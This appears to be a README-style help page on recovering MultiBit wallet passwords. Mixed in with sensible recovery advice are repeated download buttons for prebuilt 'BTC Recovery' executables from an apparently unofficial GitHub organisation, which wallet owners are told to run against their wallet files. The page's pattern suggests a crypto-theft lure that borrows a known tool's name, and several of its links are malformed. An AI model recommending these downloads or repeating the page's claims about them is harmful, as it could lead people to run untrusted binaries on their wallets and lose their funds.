<div align="center">
<img src="assets/banner-article.png" alt="MultiBit wallet password recovery">
</div>

# MultiBit wallet password recovery

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

MultiBit wallets are old-format local files encrypted with a password the user chose, and they behave like every other local wallet file: no reset, no server, no recovery email. What they need is a copy of the file, a candidate list built from what you remember, and a local search against the right wallet type.

## You'll see this if

The file is from an era when a wallet was a single download, often in a folder nobody named, and the password was whatever seemed memorable in 2013.

| What you have | What it is | Where to go |
|---|---|---|
| A `.wallet`, `.wallet.aes` or similarly named file in a MultiBit folder | the encrypted wallet | here  -  password search |
| A folder with `.info`, `.wallet` and a `.bak` beside it | the same wallet plus its rollback copies | here  -  try the `.bak` too |
| A file that opens and shows addresses but will not spend | encrypted, password missing | here |
| A phrase of twelve words with the file | the wallet's recovery words, if the version had them | [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) |
| A file that no longer opens in any version | damaged or truncated rather than locked | [A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md) |
| A file whose password is known but whose balance is zero | wrong wallet or an already-swept balance | [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md) |

## Why it happens

MultiBit wrote a single encrypted file per wallet, with a rollback copy beside it and a small metadata file describing the wallet. The password encrypted the keys in place, locally, and nothing recorded a hint. That design has one advantage for recovery: the file is a complete, self-contained artifact, so any copy of it is as good as the original.

The rollback copies matter more than people expect. MultiBit kept a `.bak` and sometimes a checkpoints file, and an older copy can hold the same addresses with a password you remember better  -  or an unencrypted state from before a password was set. Checking those files takes a minute and occasionally removes the problem entirely.

Old software raises a second issue: a wallet written by one version may not open in another, and some files need the version that wrote them. That is not damage, it is format drift, and it means the identification step matters as much as the password search: [You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md).

Two files in a MultiBit folder are routinely overlooked. The small metadata file describes the wallet  -  which generation wrote it, when, and whether encryption was applied at all  -  and reading it decides whether a current build can open the file. The checkpoints file stores recent wallet states, so a wallet that refuses to open can sometimes be rolled back to a state that opens, and that rollback occasionally lands before a forgotten password was ever set.

Old passwords are also products of their moment: a word plus two digits, a name with a capital, a keyboard pattern walked with one hand. Rules that assume any of those are cheap to test and cover most of the space of a wallet from that era, which is why a narrow first run is usually the right one.

## Fix

Gather every copy of the file, confirm which one holds your addresses, then search the password locally.

1. **Collect all copies.** The wallet file, its `.bak`, any checkpoint files and anything in an old backup folder. More copies means more chances that one is unencrypted or older.
2. **Record the addresses** from any copy that opens, and compare them with your records. That confirms you have the right wallet before any search begins.
3. **Write down what you remember about the password**  -  length, words, numbers, whether it was reused elsewhere, and the year the wallet was made.
4. **Build candidate rules from that**, starting tight: one token, one separator, one digit pattern. A short password from 2013 is usually a small space: [Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md).
5. **Download the current release from the GitHub releases page** and run the search offline against a copy, selecting the wallet type explicitly: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
6. **Try the unencrypted possibility first if a copy allows it.** An older backup may predate the password, which ends the search immediately.
7. **Sweep the balance to a current wallet** once the file opens, and keep the old file as an archive rather than as a working wallet.

## If that did not work

If a search finishes empty, the file is probably not the one the password belongs to, or the rules are tighter than the memory.

Test the artifact first: an address mismatch means the wrong file, and no password will fix that. Then widen the rules in the cheapest direction  -  case variants, then a trailing character, then an extra word. Old wallets often carry passwords with a single capital letter, and a rule that assumes lowercase everywhere will miss them.

If the file will not open in any version of the software, treat it as a data-recovery problem rather than a password one: check for a `.bak`, a checkpoint file, or a copy on an old disk. A truncated wallet cannot be decrypted by anything, and the honest next step is finding another copy rather than another tool.

## Prevention

- Copy wallet files into a labelled backup folder the day you create them.
- Store the password in a manager rather than reconstructing it years later.
- Keep the version of the software that wrote the wallet, or note it beside the file.
- Sweep old wallets into a current one you can restore from a phrase.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Can a MultiBit wallet password be recovered?

Yes, by searching candidates against a copy of the wallet file, provided something about the password survives in memory. There is no reset, because nothing outside the file holds the password.

### What files should I look for?

The wallet file itself, its `.bak`, and any checkpoint or metadata files that sit beside it. Older copies are worth testing first: one of them may predate the password entirely.

### Is a MultiBit wallet the same as a Bitcoin Core wallet?

No. Both are local encrypted files, but the formats are unrelated, and a recovery run needs the correct wallet type selected. A Core `wallet.dat` will not open as a MultiBit wallet, and vice versa.

### What if the software no longer opens the file?

Treat it as format drift or damage rather than a lost password: try the version that wrote it, look for a rollback copy, and check old disks for another copy before assuming the file is unrecoverable.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [wallet.dat password recovery for Bitcoin Core]([wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md))
- [Bitcoin wallet password recovery tool]([Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md))
- [Token lists and password patterns]([Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md))
- [Old wallets and Bitcoin from years ago]([Old wallets and Bitcoin from years ago](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/old-wallet-recovery-with-btcrecover.md))
